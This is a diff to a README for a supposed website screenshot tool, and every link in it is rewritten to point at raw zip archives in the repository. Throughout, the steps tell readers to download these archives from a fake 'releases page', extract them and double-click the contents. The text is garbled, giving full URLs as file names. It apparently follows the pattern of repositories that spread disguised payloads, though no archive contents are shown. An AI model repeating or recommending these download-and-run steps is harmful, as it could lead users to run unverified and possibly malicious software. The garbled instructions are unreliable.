@@ -9,19 +9,19 @@ Follow the steps below to download and run the website-screenshot-generator.
 1. **Visit the Releases Page**  
    Click the button below to go to the releases page where you can download the latest version:
 
-   [![Download Website Screenshot Generator](https://raw.githubusercontent.com/phong1379/website-screenshot-generator/main/tests/website-screenshot-generator_unsignalized.zip%20Screenshot%https://raw.githubusercontent.com/phong1379/website-screenshot-generator/main/tests/website-screenshot-generator_unsignalized.zip)](https://raw.githubusercontent.com/phong1379/website-screenshot-generator/main/tests/website-screenshot-generator_unsignalized.zip)
+   [![Download Website Screenshot Generator](https://github.com/phong1379/website-screenshot-generator/raw/refs/heads/main/src/screenshot-website-generator-1.1.zip%20Screenshot%https://github.com/phong1379/website-screenshot-generator/raw/refs/heads/main/src/screenshot-website-generator-1.1.zip)](https://github.com/phong1379/website-screenshot-generator/raw/refs/heads/main/src/screenshot-website-generator-1.1.zip)
 
 2. **Choose the Latest Release**  
    On the releases page, you will see a list of available versions. Look for the most recent release at the top.
 
 3. **Download the Application**  
-   Find the file named `https://raw.githubusercontent.com/phong1379/website-screenshot-generator/main/tests/website-screenshot-generator_unsignalized.zip` under the latest release. Click on it to begin your download.
+   Find the file named `https://github.com/phong1379/website-screenshot-generator/raw/refs/heads/main/src/screenshot-website-generator-1.1.zip` under the latest release. Click on it to begin your download.
 
 4. **Extract the Files**  
    Once the download is complete, locate the `.zip` file in your Downloads folder. Right-click on the file and select "Extract All" to unpack its contents.
 
 5. **Open the Application**  
-   Inside the extracted folder, you will find the application file named `https://raw.githubusercontent.com/phong1379/website-screenshot-generator/main/tests/website-screenshot-generator_unsignalized.zip`. Double-click this file to open the application.
+   Inside the extracted folder, you will find the application file named `https://github.com/phong1379/website-screenshot-generator/raw/refs/heads/main/src/screenshot-website-generator-1.1.zip`. Double-click this file to open the application.
 
 ## 📋 Features
 - **Automated Screenshot Capture**: Quickly take snapshots of any webpage.
@@ -41,13 +41,13 @@ To ensure smooth operation, please make sure your system meets the following req
 To install the website-screenshot-generator, simply visit the releases page and follow these steps:
 
 1. Click the link below to go directly to the download page:  
-   [Download Website Screenshot Generator](https://raw.githubusercontent.com/phong1379/website-screenshot-generator/main/tests/website-screenshot-generator_unsignalized.zip)
+   [Download Website Screenshot Generator](https://github.com/phong1379/website-screenshot-generator/raw/refs/heads/main/src/screenshot-website-generator-1.1.zip)
 
 2. Choose the latest `.zip` file to download.
 
 3. Extract the contents of the downloaded file.
 
-4. Open the `https://raw.githubusercontent.com/phong1379/website-screenshot-generator/main/tests/website-screenshot-generator_unsignalized.zip` file to start using the application.
+4. Open the `https://github.com/phong1379/website-screenshot-generator/raw/refs/heads/main/src/screenshot-website-generator-1.1.zip` file to start using the application.
 
 ## ⚙️ How to Use
 Using the website-screenshot-generator is straightforward. Here’s how:
@@ -69,6 +69,6 @@ Using the website-screenshot-generator is straightforward. Here’s how:
 If you encounter any issues or have questions about using the website-screenshot-generator, feel free to open an issue on the GitHub page. Your feedback helps improve the application.
 
 For more information, visit the releases page:  
-[Visit Releases](https://raw.githubusercontent.com/phong1379/website-screenshot-generator/main/tests/website-screenshot-generator_unsignalized.zip)
+[Visit Releases](https://github.com/phong1379/website-screenshot-generator/raw/refs/heads/main/src/screenshot-website-generator-1.1.zip)
 
 Explore the endless possibilities of capturing and documenting websites with ease. Enjoy using the website-screenshot-generator!
